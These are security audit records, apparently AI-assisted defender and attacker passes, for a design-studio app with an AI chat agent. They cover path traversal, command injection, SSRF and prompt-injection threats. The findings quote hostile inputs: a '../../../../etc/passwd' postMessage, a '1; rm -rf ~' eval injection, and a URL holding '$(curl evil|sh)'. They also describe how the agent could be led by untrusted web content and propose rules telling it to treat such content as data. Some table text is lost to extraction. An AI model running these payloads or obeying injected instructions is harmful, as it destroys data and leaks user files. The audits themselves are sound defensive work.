`apps/studio/inspect.ts:151` (`mtimeFor`). `rel = (file||'').replace(/^\/+/, '')` strips only leading slashes; `Bun.file(path.join(ctx.paths.repoRoot, rel)).lastModified` then follows `../` out of the repo. Reachable from untrusted content: the canvas iframe `postMessage({dgn:'select', selection:{file:'../../../../etc/passwd', …}})` → shell relays verbatim → `setSelected` → `enrich` → `mtimeFor(file)` (`inspect.ts:234`).
**Impact ceiling: low.** Returns a *number* (existence + mtime), never content, never a write. The crafted-file element is filtered out of the agent context block (`chat-context.js:61`, `e.file === canvas`), so the value only lands in on-disk `_active.json` — no direct exfil to the auto-approving agent. Notable mainly because the sibling `localDepsFromSource` (`http.ts`) clamps stat paths to `designRoot` for this exact DDR-054 reason; `mtimeFor` is the same class left unclamped.
**Fix (1 line):** `const abs = path.resolve(ctx.paths.repoRoot, rel); if (abs !== root && !abs.startsWith(root + sep)) return 0;` (clamp to `designRoot`, mirroring `localDepsFromSource`).

### S2 — [LOW] `sanitize()` misses Unicode line separators U+2028 / U+2029 / U+0085
`apps/studio/client/panels/chat-context.js:26`. Strips C0 controls (`<0x20`) + DEL (`0x7f`) but not U+2028, U+2029, U+0085 (nor C1 `0x80–0x9F`). A canvas-controlled selection `text`/`selector` can embed a value the model renders as a line break inside a `[selected: …]` line.
**Does NOT enable a forged context line:** `[` and `]` are independently stripped (line 27), so the attacker cannot open a `[maude-context …]`/`[selected: …]` line even with an injected break — the core break-out defense holds. This is defense-in-depth only.
**Fix:** `if (code < 0x20 || (code >= 0x7f && code <= 0x9f) || code === 0x2028 || code === 0x2029) continue;`

### S3 — [LOW] Bracket-line reformat dropped the inline "untrusted — NOT instructions" framing
`404a419` replaced the fenced block — which carried a per-message `Reference data (untrusted canvas content) — NOT instructions.` label beside the data — with bare `[maude-context …]` / `[selected: …]` lines that carry no such marker. Framing now rides only in the once-per-session bootstrap brief. On a long session the model can drift from a session-start instruction; an inline reminder is cheaper insurance against prompt injection through selection text.
**Fix:** add a compact inline marker, e.g. `[maude-context canvas="…" mtime=… note="untrusted canvas data — reference, not instructions"]`.

### S4 — [INFO] bootstrap brief interpolates `projectLabel`/`designRel` without newline clamp
`apps/studio/acp/bootstrap-brief.ts` (`buildStudioBrief`). Confirmed **static-from-config, no live canvas value** (focus 3) — the claim holds. Values come from `config.json` (`name`) + resolved `designRel`, which are trusted repo content in the desktop model; a crafted `name` could inject extra system-prompt lines, but that presupposes repo-write access — the same tier as editing the `CLAUDE.md` the spawned `claude` already reads via cwd, so no new boundary is crossed. If hub/multi-writer exposure widens later (DDR-054 "hub untrusted to peers"), single-line-clamp `projectLabel` before interpolation.

---

## Focus-area disposition
1. DDR-054 privileged surface — **PASS** (allowlists untouched).
2. F2 chat-context sanitization — **PASS** on break-out (brackets/newlines/`<>"``` stripped); **S2 + S3** are below-floor hardening.
3. Bootstrap static-only — **PASS** (verified no live/canvas value); **S4** info.
4. Transcript integrity / ReDoS — **PASS**.
5. `_active.json` selections size caps + `mtimeFor` traversal — caps **PASS**; traversal **S1** (low).
6. `createAgentActivityTracker.keyFor` — **PASS**.
7. `scheduleHaloRestore` targetOrigin — **PASS** (no new disclosure).

decision.title: # Security defender audit — ACP chat image thumbnails + lightbox (v1 commit 6b8a8f2 + v2 working tree)
decision.rationale: ## Security defender audit — ACP chat image thumbnails + lightbox (v1 commit 6b8a8f2 + v2 working tree) ### Evidence sources - Diff base: commit `6b8a8f2` (v1, committed) + uncommitted working-tree v2 slice on `main` - Changed files (source-relevant): `apps/studio/api.ts`, `apps/studio/http.ts`, `apps/studio/client/panels/ChatPanel.jsx`, `apps/studio/client/panels/acp-runtime.js`, `apps/studio/client/app.jsx`, `apps/studio/client/styles/6-acp-chat.css`, `apps/studio/test/{acp-attachment-serve,acp-origin-gate,canvas-origin-gate,chat-attachments}.test.ts`, `apps/studio/dist/*` (rebuild artifacts) - Lockfile changes: yes — `apps/desktop/src-tauri/Cargo.lock`, inspected: version-parity bump only (`maude-desktop 0.37.0 → 0.38.1`), zero dependency changes - Config: no `security` block in `.ai/workflows.config.json` → defaults (severityFloor `medium`, scope `["classic","ai","supply-chain"]`) ### Blockers (severity >= medium) - `apps/studio/client/panels/acp-runtime.js:446-466` — **A9 path traversal / containment-invariant bypass in `designImageRefs`** (medium) - Snippet: `` (?:[^\s`'"()\[\]]*/)?${esc}/[^\s`'"()\[\]]+?\.(?:png|jpe?g|gif|webp) `` - Why: The token character class admits `.` , `/` and `%`, so hostile/prompt-injected **assistant** text (the DDR-145 threat lane — transcript text is partly tool-output-derived) escapes the claimed `/` containment. Verified empirically: - `designImageRefs('.design/../../../Users/x/private/photo.png')` → `["/.design/../../../Users/x/private/photo.png"]` (browser collapses dot-segments before the request → arbitrary path) - `designImageRefs('.design/..%2f..%2fsecrets/cam.png')` → emitted as-is; `safePathUnderRoot` (http.ts:155) **decodes** `%2f` server-side → climbs out of designRel, re-confined only at repoRoot - `designImageRefs('.design/sub/../../site/public/tracker.png')` → escapes via an interior dot-segment The code comment ("nothing outside `/` ever matches") and DDR-145 state a containment property the regex does not enforce. Residual server-side defenses hold — `safePathUnderRoot` confines to repoRoot, extension forces `Content-Type: image/*`, static lane sets `nosniff`, URL is always same-origin relative (no remote-fetch/exfil beacon possible) — so realized impact today is "render any raster anywhere under repoRoot in the chat", which is why this is medium rather than high. But it is exactly the DDR-054/088-style boundary the feature documents and tests as a security property, and hub/multi-user directions lean on such claims. - Fix: in `designImageRefs`, reject any matched token containing `..` as a path segment or a `%` character (or `decodeURIComponent` + `posix.normalize` the candidate and require the normalized path to still start with `${rel}/`), and add these three hostile shapes to `chat-attachments.test.ts` alongside the existing `not-.design/` case. ### Warnings (below floor) - `apps/studio/http.ts:673-678` — A6/A12 defense-in-depth (low) — the new GET branch serves **uploaded** bytes via `serveFile` without `X-Content-Type-Options: nosniff`, while the parallel repoRoot static lane (http.ts:1589) adds it explicitly for exactly this class (DDR-088: uploaded GIF/WEBP polyglots) — and this lane is on the *more privileged* main origin. Magic-byte sniff at write time + explicit `image/*` Content-Type make exploitation theoretical; still, add `'X-Content-Type-Options': 'nosniff'` to the GET's header bag for lane parity. - `apps/studio/api.ts:1090` / write side — integrity note (low) — content addressing truncates SHA-256 to 8 hex chars (32 bits). A birthday collision (~77k attachments, or a deliberately crafted second preimage-ish collision against the truncation) makes two different images share a name; combined with `Cache-Control: immutable, max-age=31536000` the first image is pinned forever for the second's references. Local-single-user impact is cosmetic; if attachments ever cross the hub trust boundary, widen to sha16+. ### Dependency surface - New deps: none. `Cargo.lock` delta is the own-crate version bump only. No package.json/bun.lock changes in scope. ### Verified-good (checked, no finding) - **A9 server side**: `resolveChatAttachment` (api.ts:1091-1100) — strict `^[0-9a-f]{8}\.(?:png|jpe?g|gif|webp)$` allowlist on the only input, plus `path.resolve` containment assert; SVG excluded on both write and read; hostile-name matrix pinned in `acp-attachment-serve.test.ts` (traversal, encoded traversal, absolute path, double extension, uppercase hex, 9-hex, prefixed path → all 404). - **A7 CSRF posture on GET**: correct as designed — GET is read-only/state-free, so omitting `sameOriginWrite` is right; POST keeps the CSRF gate; DELETE/PUT → 405. - **DDR-054/088 dual-allowlist**: `/_api/acp/attachment` absent from BOTH `CANVAS_SAFE_API` (http.ts:1636) and `startCanvasServer` routes (server.ts — no match); canvas-origin 403 asserted in `acp-origin-gate.test.ts:121` and `canvas-origin-gate.test.ts:121`. - **Cross-site image theft**: main server binds `127.0.0.1` (server.ts:138/226); `serveFile` emits no `Access-Control-Allow-Origin`, so a drive-by page can embed but not read pixels (canvas taint); the content-addressed sha8 name is derived from image content, not enumerable in practice. - **A6 XSS**: all new render paths are React text lanes (`{seg.text}`, `` from constructed same-origin URLs, `encodeURIComponent(name)`); no `dangerouslySetInnerHTML`/`innerHTML` in the diff; `chat-markdown.jsx` renders React nodes, never innerHTML (checked). - **DoS**: `ChipOrThumb` poll is bounded (20 × 250 ms, cleared on unmount); `designImageRefs` caps 6/message + dedups, bounding a hostile wall-of-paths. - **Cache-header safety**: `immutable` on the attachment GET is justified by content addressing (modulo the sha8-width note above); static lane stays `no-store`. - A1/A2/A3/A4/A5/A8/A10/A11/A12 regex passes over the changed files: no hits beyond the items above. Summary: 1 blocker, 2 warnings, 3 notes. Verdict: **NEEDS FIXES** (one small, client-side fix — tighten `designImageRefs` token validation; the server backstops keep it medium, not high).

decision.title: Security review — feature-moodboard-first-discovery (Defender pass)
decision.rationale: # Security review — feature-moodboard-first-discovery (Defender pass) - **Scope:** `git diff c5e0b57..HEAD` + the uncommitted working-tree change to `apps/studio/bin/prep.sh`. - **Commits:** `219d289` (feat DDR-147) · `d190381` · `ec58b1a` · `ac8dea0` (+ `d5ac4ba` site re-sync). - **Config:** `.ai/workflows.config.json` has **no `security` block** → schema defaults apply: `severityFloor = medium`, `includeAi = true`, `scope = [classic, ai, supply-chain]`. **Medium and above are blockers.** - **Lens:** `flow:security-rules` (classic OWASP + AI-era: indirect prompt injection, lethal trifecta, excessive agency, output handling). - **Date:** 2026-07-03 --- ## TL;DR The **`prep.sh` injection fix HOLDS** — verified below, no sibling field carries the same class. The blockers are all in **new SPEC text** (the DDR-147 "download-first" imagery rule in `_bootstrap.md`): the documented recipe instructs a future agent to build a `curl` command, choose a local write path, `Read` an image, and quote captions/provenance into a persisted canvas — all from **web-research-derived (untrusted) URLs, filenames, and text** — with **no inert-data handling**. This is one root cause (harvested web data treated as trusted) with four facets: command injection, path traversal, SSRF/scheme abuse, and indirect prompt injection that **reintroduces the lethal trifecta at the orchestrator** the `ux-research-agent` was carefully designed to avoid. DDR-147 addresses this surface only from a *rendering-reliability* angle, never a security one. --- ## Findings | # | Severity | File:line | Description | Fix | |---|----------|-----------|-------------|-----| | 1 | **Resolved (verify PASS)** | `apps/studio/bin/prep.sh:97,166` | Injection fix for `MOODBOARD_VARIANTS`. config.json is untrusted (DDR-054: opening a third-party repo); the old `jq -r '.moodboard.variants // 3'` emitted the raw value and `printf '…=%s\n'` fed it into the caller's `eval "$(prep.sh --shell-export)"`. A config value like `1; rm -rf ~` was a straight shell-injection into the eval'd export. **The fix closes it twice over:** (a) jq now type-coerces + clamps — `if type=="number" then floor else 3 end \| if .<1 then 1 elif .>3 then 3 else . end` → output is provably an integer 1–3 (string/bool/array/object payloads fall to `3`); (b) the printf switched `%s`→`%q`, shell-quoting the value regardless. Either layer alone closes it; together it's robust. **Verified holds.** | None needed. | | 2 | **Medium** | `_bootstrap.md:362` (also `:400`, `:419`) | **Command injection via untrusted URL in the `curl` recipe.** The documented recipe is `curl -fsL -A "" -o ""` where `` comes from `reference_images[]` / `og:image` harvested by WebFetch from arbitrary research pages (fully untrusted). The spec's double-quotes do **not** stop `$(…)` / backtick command substitution — a harvested `https://x/a.png$(curl evil\|sh)` executes when the agent interpolates it. No instruction to treat the URL as inert data or reject shell metacharacters. Runs with the **agent's full shell privileges** (not the sandboxed browser fetch the old hotlink-`` used). | Add an untrusted-input block to the download rule: validate `` is a plain `https://` URL (regex, no shell metachars) before use; pass it as a positional arg / `"$url"` variable, never string-interpolate research text into the command. | | 3 | **Medium** | `_bootstrap.md:362,400` | **Path traversal / arbitrary file write via `-o `.** The spec says "fetch every used image into `/assets/moodboard//`" but never specifies how the destination filename is derived or that it must be confined. If the agent derives it from the URL basename (the natural default), a harvested name containing `../` writes outside the assets dir (e.g. into `.git/hooks/`, source files). Because these assets are meant to be **versioned/committed** (the whole point of download-first per DDR-147), a poisoned write lands in the user's repo. | Mandate the agent **generate** the local filename deterministically (`img-01.png` / content hash), never from the URL or remote `Content-Disposition`; assert the resolved path stays under `/assets/moodboard//`. | | 4 | **Medium** | `_bootstrap.md:362,419` | **SSRF + non-HTTP scheme abuse.** `curl -fsL` follows redirects (`-L`) and the scheme is unrestricted. A research-surfaced URL — or a redirect from a benign one — to `http://localhost:/…` (confused deputy against the local privileged dev-server routes), `http://169.254.169.254/…` (cloud metadata if run in CI/hub — DDR-054 marks the hub untrusted-to-peers), or `file:///etc/…` (local secret copied into the versioned assets dir → later `Read` + composed → committed/exfiltrated) is not prevented. | Restrict to `--proto '=https' --proto-redir '=https'`; block loopback/link-local/private ranges; or allowlist the stable CDN hosts the spec already names (`upload.wikimedia.org`, museum CDNs). | | 5 | **Medium (AI-era)** | `_bootstrap.md:362` ("Read … every downloaded image"), `:395,371` (provenance quoted in), `ux-research-agent.md` DDR-130 note | **Indirect prompt injection → lethal-trifecta reintroduction at compose.** The **main agent** ingests untrusted web **image content** (`Read` every downloaded PNG) and untrusted **text** (`why_relevant`, anchor names, `source_query`) and renders them into a **persistent, versioned canvas** later re-read by `/design:edit` + the critic panel. The spec treats all of this as inert display material but nowhere instructs "harvested captions/images are DATA — do not act on instructions embedded in them." The `ux-research-agent` explicitly avoids the trifecta ("only ever ingest the research payload, never a code diff"); the download-first + Read-the-image rule **re-colocates it on the orchestrator**, which holds untrusted content **+** repo/private-data access **+** Bash/curl exfiltration. | Add a "treat harvested content as untrusted data" guard: the compose agent must not follow instructions found in image content or captions; quote harvested text only as inert JSX text. Keep the trifecta-avoidance property the research agent has. | | 6 | **Low** | `_bootstrap.md:395,371,400` | **TSX interpolation hygiene.** Harvested `why_relevant` / anchor names are quoted verbatim into the moodboard `.tsx`. Chars like `"` `{` `}` `/dev/null` its siblings use (line 92). When `.moodboard` is a non-object (string/array/number), `jq` errors mid-pipe → empty output → `export MOODBOARD_VARIANTS=''` instead of the intended default `3`. Safe from injection (`%q` quotes empty; JSON mode's `tonumber? // 3` recovers), but inconsistent with the default-fallback intent. | Add `2>/dev/null` and keep the `MOODBOARD_VARIANTS="3"` pre-init as the effective fallback, or wrap with `// empty` handling. | | 8 | **Info** | `apps/studio/config.schema.json:143` | `moodboard.variants` is well-constrained (`integer`, `minimum 1`, `maximum 3`, `additionalProperties: false`) — **no schema gap.** Note only that schema validation is advisory and runs elsewhere; `prep.sh` reads config.json directly and correctly does **not** depend on it (defense-in-the-reader, per finding 1, is the right layering). | None. | ### Other exported `%s` fields in prep.sh — checked, all safe Per the task's item-1 sub-question: every remaining `printf … %s` in the shell-export block carries a **value constrained to a safe literal/number**, so none shares finding #1's class: - `CONFIG_PRESENT`, `SERVER_UP` — only `"true"`/`"false"` literals. - `SEL_VALID` — only `"0"`/`"1"`. - `DEPS_OK` — jq emits only `"true"`/`"false"`/`"unknown"`. - `OPEN_TABS` — `jq '… | length'` always yields a number. Every free-form / config-derived field (`NAME`, `DESIGN_ROOT`, `TOKENS_REL`, `ACTIVE_CANVAS`, `SELECTED_FILE`, `SERVER_PORT`, …) already uses `%q`. `SELECTED_ELEMENT` is only consumed in JSON mode via `--argjson` (valid-JSON gated, no eval). The `MOODBOARD_VARIANTS` line was the last config-derived `%s`; it's now `%q`. --- ## Verdict The committed-code acute issue is closed and holds. The remaining blockers are spec-level missing controls in an agent-executed recipe — small, single-root-cause fix (a short "harvested URLs/filenames/captions/images are untrusted DATA" hardening block on the download-first rule: https-only + no redirect to private + agent-generated local filenames + no shell-metachar interpolation + treat captions/images as inert data). Under `severityFloor = medium`, findings 2–5 gate. **VERDICT: NEEDS FIXES**

# Security review — Annotations FigJam-parity v3 + AI loop (Waves F+G+H)

**HEAD at review:** `f9a68b7` (uncommitted working tree) · **Date:** 2026-06-11
**Passes:** `security-auditor` (defender) + `ethical-hacker` (attacker), parallel via `/flow:done` step 4.

## Verdicts

- **Defender: PASS WITH SUGGESTIONS** — 0 blockers ≥ medium, 1 LOW (esc enum attrs, applied), 3 notes. Files scanned: ~22. Deps flagged: 0.
- **Attacker: NEEDS FIXES → resolved** — 4 findings, 1 chained HIGH (F4×F3×F1). After fixes: residual risk LOW/accepted.

## Findings → resolution

| ID | Sev | Title | Resolution |
| -- | --- | ----- | ---------- |
| F2 | MEDIUM | `annotate.mjs` PUTs `_server.json.url` with no loopback allowlist — SSRF/exfil of full canvas SVG | **FIXED** — `isLoopbackHttpUrl()` gate; non-loopback → local file write. Test added. |
| F4 | MEDIUM | `svgToStrokes` keeps Infinity/NaN geometry; reader coerces to 0 → AI/human view divergence (off-board spoof) | **FIXED** — `pfloat()` finite-clamp on all geometry parses + `polygonBBox` non-finite skip. Tests added. |
| F3 | MEDIUM | `data-author="ai"` forgeable provenance (value clamped, provenance not authentic) | **MITIGATED** — documented non-trust in SKILL.md trust-model + DDR-100 addendum. |
| F1 | HIGH (chained) | read→write AI loop = prompt-injection trifecta (untrusted text + repo-read + egress) | **MITIGATED** — F2 removes the arbitrary-exfil leg (loopback-only); SKILL.md guidance on context separation / user gate. |
| F5 | LOW | document-global CustomEvent channels driveable by co-resident canvas code | **ACCEPTED** — not a new boundary crossing (same-origin already had `PUT /_api/annotations`); noted in DDR-100. |
| LOW (def) | LOW | `data-shape`/`data-align`/`data-list` serialized without `esc()` | **FIXED** — wrapped in `esc()` (no-op on enums; canary green). |

## Clean surfaces (both passes agreed)
- No new canvas-origin HTTP route (DDR-054/088 allowlists untouched); `annotate` reuses the server-sanitized + 1 MB-capped `PUT /_api/annotations`.
- Sanitizer move to `annotations-model.ts` byte-faithful (element allowlist, on*/style/*href denylist, quote-glued-handler lookbehind, `assets/` href re-validation).
- `annotate.mjs`: no shell/exec, no prototype pollution (Map lookups + explicit-key construction, no raw-op spread), `fileSlug` slash-flatten blocks path traversal, 1 MB cap enforced pre-write.
- Clipboard paste re-serializes through the canonical sanitizer + re-mints ids — foreign clipboard JSON can't smuggle script or collide ids.
- `recomputeBoundArrows` is O(n), `isBindable` excludes arrows/sections → no cyclic-host DoS.
- No new npm deps (plan invariant holds).

## Accepted residual (pre-existing)
`PUT /_api/annotations` accepts an arbitrary `file` from the canvas origin (LWW sibling overwrite) — inherited unchanged, governed by DDR-054; this feature adds no new exposure.

Full reviewer narratives are consolidated in `.ai/logs/code-reviews/figjam-v3-waves-fgh.md`.

decision.title: Security review — hub-sync cold-start safety (DDR-102)
decision.rationale:
# Security review — hub-sync cold-start safety (DDR-102)

- **Date:** 2026-06-12
- **HEAD at review:** working tree vs `649114c` (uncommitted feature)
- **Scope:** 13 source files — `apps/studio/sync/{journal,cold-start,agent,codec,index,projection,migrate-seed,status,connection-state}.ts`, `apps/studio/history.ts`, `apps/hub/src/server.mjs`, `cli/lib/design-link.mjs`, `apps/studio/client/app.jsx`
- **Panel:** `security-auditor` (defender) + `ethical-hacker` (attacker), parallel; severity floor `medium` (config default).

## Verdict

**PASS** after one MEDIUM fix.

- Defender: **PASS** — 0 blockers, 3 low/info warnings (all pre-existing / deployment-dependent), 0 new deps.
- Attacker: **1 MEDIUM (F1)** + 4 low/refuted. F1 was a genuine data-integrity gap; **fixed before commit** (see below). All other scenarios refuted or below floor.

## F1 (MEDIUM → FIXED) — snapshot-before-overwrite was best-effort, not fail-closed

**Finding:** the DDR-102 guarantee ("the loser is always snapshotted to `_history/`, so a wrong pick costs one `/design:rollback`") rested on `writeSnapshot` succeeding. The production snapshot wrapper (`index.ts`) swallows a `writeSnapshot` error into a `null` return (best-effort posture borrowed from `status.ts`). On a hub-wins conflict where the local `_history/` write failed (full disk / read-only mount / transient `Bun.write` error), `snapshots` stayed `{}` and execution fell through to the destructive `writeBodyFromDoc()` — overwriting the user's divergent local body with **no recoverable copy**, i.e. the exact 2026-06-11 incident outcome re-opened. `migrate-seed.ts` shared the flaw (local snapshot null → projection later overwrote disk). No test covered the `snapshot → null` path (every stub returned a truthy ts).

**Fix (this commit):** the pre-overwrite snapshot is now **fail-closed**. When a snapshot writer is wired (`snapshotAttempted`) and the LOSER's snapshot did not land, a hub-wins resolution **refuses the destructive overwrite** — local is kept and seeded UP instead (nothing lost on either side), the conflict carries `snapshotFailed: true`, and CLI (`maude design status`) + the studio banner surface it as an error pointing at disk/perms. Applied symmetrically in `agent.ts reconcile()` and `migrate-seed.ts`. Regression tests added: `sync-agent.test.ts` "fail-closed on snapshot failure" + `shared-doc-migrate.test.ts` "fail-closed on snapshot failure" (assert local bytes survive, winner flips to local, `snapshotFailed` recorded). DDR-102 §3 updated to document the fail-closed invariant.

## Refuted / below-floor (no action)

- **F2 `bodyEditAt` hub-controlled (LOW, refuted as escalation):** a hostile hub can force "hub always wins" via a far-future stamp, but the conflict path snapshots both sides first → recoverable. `Number.isFinite` guard rejects `Infinity`/`NaN`. Bounded to a recoverable wrong-pick; only compounds F1 (now fixed). Optional future hardening: clamp `bodyEditAt` to `now + skew`.
- **F3 journal false-fast-forward (REFUTED — the load-bearing property holds):** the fast-forward branch (the one path that skips the snapshot) gates on `journalHash == hashBytes(currentLocalBody read at decision time)`. The hub never writes the journal; it only stores hashes of bytes that physically crossed this machine's disk↔doc boundary. A stale journal can only FAIL to match → forced conflict (snapshot taken), never spuriously match divergent content. css-only checkpoints store `bodyHash:''` (can't match a real hash). No false-fast-forward path found.
- **F4 path traversal via slug (REFUTED):** `_history` slug + `journalPath` derive from the LOCAL filesystem path, never the hub's `documentName`. `fileSlug` collapses `/`→`-` and strips leading dots after percent-decode; `..` can't reconstitute a separator. Hub controls which slug gets a snapshot, not the slug text.
- **F5 rate-limit DoS behind shared-IP proxy (LOW, deployment-dependent, pre-existing):** the invalid-token bucket keys on `request.socket.remoteAddress`; behind a reverse proxy all peers collapse to one IP, so a flooder can exhaust the 100/min invalid bucket for peers behind that proxy. Contained: legitimate peers auth through the per-LABEL valid bucket (600/min, proven independent in `auth-reasons.test.mjs`), so an exhausted invalid bucket cannot starve a valid token — only first-contact/mistyped-token peers behind that edge are throttled. Known v1.1 limitation (X-Forwarded-For deliberately untrusted, `trustProxy` deferred). Documented as a deploy note.
- **F6 injection via reason/rejectedSlugs (REFUTED):** the hub `reason` is CR/LF-stripped + 200-clamped at the provider boundary, then reduced to one of four fixed classes — only a hardcoded `AUTH_CLASS_HINT` constant reaches CLI/banner; the raw reason never does. `rejectedSlugs`/conflict fields are locally-derived (filesystem slug, ISO timestamps). Banner renders escaped JSX text; CLI writes plain locally-derived strings. No new injection lane.
- **F7 authError reason mis-route (LOW, self-DoS only):** a crafted reason routing a peer into the "permanent → destroy provider" class costs at most a 5-minute sync stall per canvas, self-healing on re-probe — strictly less harmful than the transient class, and an in-path attacker already controls availability. Not a meaningful escalation.

## Defender warnings (low/info, no action)

- **W1** hub invalid-bucket per-IP shared-fate behind a proxy (= attacker F5).
- **W2** admin-API catch blocks return `err.message` (admin-authenticated, controlled validator strings, pre-existing, untouched).
- **W3** `unionCommentsById` JSON.stringify on id-less comments — O(n) but the comments lane is 1 MB-capped, not a DoS amplifier.

## AI / MCP surface

No tool/MCP definition added or modified. Synced canvas bodies remain Claude-Code context (untrusted) via the pre-existing DDR-054 `_untrusted/INDEX.json` + `.claudeignore` markers — unchanged by this diff. Trifecta check passes: sync is gated off in CI (`MAUDE_SYNC_IN_CI`), no outbound agent channel, token never enters `_sync.json`/status payload. No new indirect-injection lane.

## Deploy note (release)

Before recommending the hub behind a shared reverse proxy, ship X-Forwarded-For / `trustProxy` support and document that the invalid-token bucket is per-edge-IP (F5). Hub redeploy is needed for the limiter + reason-over-wire fixes; peer-side data safety lands regardless.

decision.title: Security review — Phase 13 Canvas Activity Overlay
decision.rationale:
# Security review — Phase 13 Canvas Activity Overlay

- **Date:** 2026-06-02
- **Branch:** main (working-tree uncommitted)
- **Trigger:** `/flow:validate` step 4 (security-auditor + ethical-hacker fan-out)
- **Config:** severityFloor=medium · includeAi=true · scope=[classic, ai]
- **Scope:** Phase-13 diff only — `activity.ts`, `use-canvas-activity.tsx`, `artboard-activity-overlay.tsx`, `ws.ts`, `inspect.ts`, `templates/_shell.html`, `canvas-lib.tsx`, `server.ts`

## Verdict: PASS at the medium floor — 0 blockers, 0 exploit chains

Both agents independently cleared the headline XSS question and found no finding at or above the medium severity floor.

| Lens | Result |
|------|--------|
| XSS / injection (filename → badge/CSS) | **Clean.** JSON transport + React-escaped text; no innerHTML/eval; injected CSS is static (no interpolation). |
| Path traversal (`path.join(designRoot, rel)`) | **Contained.** `rel` is the fs.watch relative filename (always under root) + `isCanvasFile` gate; read-only `Bun.file().text()`. |
| ReDoS (region-diff regexes) | **None.** Lazy bodies with distinct literal delimiters, no nested quantifiers → linear. |
| AI / MCP (prompt injection, trifecta, MCP supply chain) | **N/A.** No MCP/tool/agent surface added; file content never leaves the server; no model loop. Trifecta: pass. |

## Findings (all below the medium floor — non-blocking)

1. **[low→medium] Unscoped activity fan-out = cross-canvas recon residual.** `ws.ts` `broadcastHmr` delivers every canvas's `{file, status, artboard_ids, ts}` to **all** `canvas-hmr` sockets, including the segregated (DDR-054 potentially-untrusted) canvas origin. Beyond what the plain HMR feed already exposes (changed-file paths), this adds `artboard_ids` (interior structure) + a continuous active/idle **timing oracle**. Read-only metadata, no write/exec sink; exploitable only under the gated untrusted-synced-hub threat (DDR-054/DDR-060, opt-in). **Both agents PASS at the medium floor.** Action taken: **DDR-075 §(d) amended** to retract the overstated "widens no trust boundary" claim and record the residual + follow-up. **Follow-up (deferred):** scope the canvas-origin activity payload to the recipient's own canvas (carry the slug at `canvas-hmr` upgrade time, mirroring collab), or strip `artboard_ids`/coarsen `ts` from the canvas-origin variant.
2. **[low] Unbounded full-file read + uncapped `state`/`idleTimers` maps.** `refineArtboards` reads the whole canvas text (no size cap) and the `state`/`idleTimers` maps are keyed by `file` with no cardinality cap (the text stash is LRU-50). Local-input self-DoS at worst, drained by the 3 s idle timers. **Follow-up (deferred):** cap map cardinality + stash a content hash instead of full text.
3. **[informational] Latent traversal coupling.** Containment depends on the watcher being the only caller of `refineArtboards`; the exported `mark()` test seam could, if ever called with external input, make the join attacker-controlled. **Follow-up (optional):** add a `path.relative` containment assert before the disk read.

## Disposition

Validate result: **passed with warnings.** No gate blocked (no finding ≥ medium; 0 exploit chains). The one material finding (#1) is documented honestly in DDR-075 with a tracked code follow-up; #2/#3 are low/informational follow-ups. The proper scoping fix is a `canvas-hmr` protocol change (out of scope for this additive feature phase) and the residual only bites under the already-gated untrusted-hub threat.

# Security review — Phase 13.1 + 13.2 (canvas activity overlay follow-ups)

- **Date:** 2026-06-02
- **Trigger:** `/flow:validate` step 4 (security-auditor + ethical-hacker) — re-run covering 13.1 (HMR error resilience) + 13.2 (agent presence), which postdate the Phase-13 base review.
- **Config:** severityFloor=medium · includeAi=true · scope=[classic, ai]
- **Scope:** `_shell.html`, `canvas-comment-mount.tsx`, `use-agent-presence.tsx`, `participants-chrome.tsx`, `ai-banner.tsx`, `inspect.ts`

## Verdict: PASS — 0 blockers. One medium-floor residual FIXED in-flight.

- **security-auditor:** PASS, 0 findings. XSS clear (`author` → React-escaped text; `color` palette-bounded; no innerHTML/eval). `import(canvasUrl+'?v='+version)` path-confined, no traversal/cross-origin. `window.__maudeCanvasRuntime` grants canvas JS no new capability. Injected CSS static (no interpolation). AI/MCP: no model/tool loop.
- **ethical-hacker:** PASS, 0 blockers, 0 HIGH. Confirmed non-exploitable: dynamic-import, runtime-global, canvas-hmr `version` (socket ignores inbound). Residual findings (gated DDR-054 untrusted-canvas threat, no code-exec):
  - **F1 (low→medium) identity spoof:** new `ai-activity` postMessage listeners lacked an origin/source check → a hostile canvas could self-post a forged `author` → durable "AI agent · <forged>" identity.
  - **F2 (low):** canvas could self-flip the `agentEditing` HMR gate.
  - **Chain 1 (medium):** F1 + the pre-existing accepted Chain-3 relay + no-CSP main origin → believable in-canvas social-engineering. Does NOT promote to HIGH (no defender-medium pairing).
  - Creativity note: a forged agent name could leak into a `hide-chrome` export → fed to a model = indirect-injection seam (screenshot-pipeline follow-up).

## Action taken (this validate)
Applied the ethical-hacker's recommended one-guard fix to **all three** `ai-activity` postMessage handlers (`use-agent-presence.tsx`, `_shell.html` agent gate, `ai-banner.tsx`): require `e.source === window.parent && window.parent !== window` (only the trusted embedder relays; canvas self-posts rejected; standalone uses its own WS). Plus client-side `author` sanitize+cap in `deriveAgent` (the relay path bypasses the server cap). **Verified live:** legit presence renders; a forged `window.postMessage` is rejected. Recorded in DDR-078.

## Residual follow-ups (deferred, non-blocking)
- Screenshot/export pipeline: confirm a self-asserted agent name does not survive `?hide-chrome=1` capture (overlay badge vs `.dc-activity-rim` suppression).
- The activity-broadcast recon residual (DDR-075) and the canvas-origin trust model (DDR-054/DDR-060) are unchanged.

decision.rationale:
# Security review — feature-desktop-intel-mac-support

**Date:** 2026-07-08
**Branch:** main
**Scope:** `.github/workflows/build-desktop.yml` (universal arm64+x86_64 macOS build), 3 copy-only site edits.
**Config:** severityFloor=medium, includeAi=true, scope=[classic,ai]

## Verdict: PASS — 0 blockers (defender + attacker)

### Defender pass (security-auditor)

- **MAUDE_SIDECAR_SLUG staging — CLEAN.** Both staged values (`darwin-arm64`, `darwin-x64`) are static workflow-authored literals, never derived from `github.event.*`/PR/branch/issue. Workflow triggers only on `tags: ['v*.*.*']` + `workflow_dispatch` — no `pull_request` trigger, so no untrusted-context entry point exists. `sync-sidecar.mjs`/`sync-agent-browser.mjs` use the slug only as a key into a hardcoded map and `process.exit(1)` on anything unrecognized — a slug can never become a path segment, glob, or shell token. `lipo -create` uses fixed literal filenames.
- **Second Rust target (x86_64-apple-darwin) — no trust-boundary change.** Compiles the same crate source for an additional arch; same Cargo.lock, no new code.
- **Bundle-glob repoint to `universal-apple-darwin/...` — release surface unchanged.** Upload still gated on `startsWith(github.ref, 'refs/tags/v')`. Same artifact types, just fat binaries.
- **Supply-chain — no new actions or deps.** Only pre-existing actions appear; x86_64 agent-browser is the same pinned `agent-browser` devDependency, just its x64 bin.
- **AI/MCP scope: N/A** — pure build/packaging workflow, no LLM/agent/tool-output surface in the diff.
- **Informational (pre-existing, not introduced by this diff):** `dtolnay/rust-toolchain@stable` + `softprops/action-gh-release@v2` pin to mutable refs, not commit SHAs — repo-wide hardening gap, below floor for a change-scoped audit.

